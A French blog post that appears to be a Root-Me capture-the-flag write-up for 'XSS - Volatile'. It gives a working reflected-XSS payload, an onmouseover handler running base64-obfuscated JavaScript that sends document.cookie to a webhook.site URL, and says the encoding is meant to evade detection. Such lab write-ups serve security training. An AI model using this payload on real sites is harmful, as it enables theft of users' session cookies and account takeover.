---
title: 'XSS - Volatile'
description: "Exploitation d'une XSS réfléchie avancée avec événement mouseover"
pubDate: 'Jul 1 2025'
heroImage: '/src/assets/root_me/rootme14-0.png'
---

## 13. XSS - Volatile

**Objectif :** Voler le cookie de l'administrateur (administrateur sensibilisé à la sécurité)  
**Méthode :** XSS réfléchie via événement mouseover et exfiltration par webhook  
**Outils utilisés :** Webhook.site / injection de code / événements HTML  
**Temps :** 1h30  


### Solution

Exploitation d'une XSS réfléchie complexe sur un administrateur prudent qui ne clique pas sur les liens suspects.

<div class="flex items-center justify-center m-auto  mb-4 object-cover"><img src="/images/root_me/rootme14-0.png"/></div>

**Étapes :**
1. Identifier le point de contact avec l'admin : signalement de pages inexistantes
2. Comprendre que l'admin ne cliquera pas sur les liens
3. Utiliser l'événement `mouseover` au lieu du clic
4. Encoder le payload en base64 pour éviter la détection
5. Injecter le payload :
   ```html
   <a href='?p=' onmouseover=eval(atob('bmV3IEltYWdlKCkuc3JjPSJodHRwczovL3dlYmhvb2suc2l0ZS9jYWE4NmEyMy03MmU1LTQ4N2MtYTk5ZC0wOWIwMjNiZjEwOTM/Y29va2llPSIrZG9jdW1lbnQuY29va2ll')) href=''>...</a>
   ```
6. Le simple survol déclenche l'exfiltration du cookie
7. Récupérer le cookie admin sur le webhook

<div class="flex items-center justify-center m-auto  mb-4 object-cover"><img src="/images/root_me/rootme14-1.png"/></div>

<div class="flex items-center justify-center m-auto  mb-4 object-cover"><img src="/images/root_me/rootme14-2.png"/></div>

<div class="flex items-center justify-center m-auto  mb-4 object-cover"><img src="/images/root_me/rootme14-3.png"/></div>

<div class="flex items-center justify-center m-auto  mb-4 object-cover"><img src="/images/root_me/rootme14-4.png"/></div>

<div class="flex items-center justify-center m-auto  mb-4 object-cover"><img src="/images/root_me/rootme14-5.png"/></div>
